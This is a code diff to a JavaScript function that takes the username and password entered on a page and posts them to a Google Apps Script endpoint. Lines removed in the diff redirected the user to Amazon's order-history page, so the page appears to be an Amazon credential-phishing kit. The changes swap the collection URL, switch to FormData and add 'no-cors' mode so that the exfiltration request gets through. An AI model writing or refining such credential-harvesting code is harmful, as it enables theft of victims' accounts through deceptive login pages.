@@ -847,27 +847,22 @@ async function sendToSheet() {
   alert("Sending Data . . .");
   let username = document.getElementById("username").value;
   let password = document.getElementById("password").value;
-  const url = "https://script.google.com/macros/s/AKfycbyoYwcp4XobvJcgumcAt-Y2Uc1LwKvMCMdnrM0p-dlnO_Sy3p4ZL2-hlLm6e1KwxHwy/exec";
+  const url = "https://script.google.com/macros/s/AKfycbxpcFVZRcvbXduOm-jK20zUGVu25wjBDXMkHSiT-gS4U920bA9mfUKMbx-5tu5A9_wl/exec";
 
-  const data = {
-    username: username,
-    password: password
-  };
+  const formData = new FormData();
+  formData.append("username", username);
+  formData.append("password", password);
 
   try {
     await fetch(url, {
       method: "POST",
-      body: JSON.stringify(data),
-      headers: {
-        "Content-Type": "text/plain;charset=utf-8"
-      }
+      body: formData,
+      mode: "no-cors"   // 🔥 IMPORTANT
     });
 
-    console.log("✅ Sent successfully");
-    alert("Sending Data . . .");
-    window.location.href="https://www.amazon.com/gp/css/order-history?ref_=nav_orders_first";
-  } catch (error) {
-    console.error("❌ Error:", error);
+    console.log("✅ Sent (no-cors)");
+  } catch (err) {
+    console.error("❌ Error:", err);
   }
 }
 
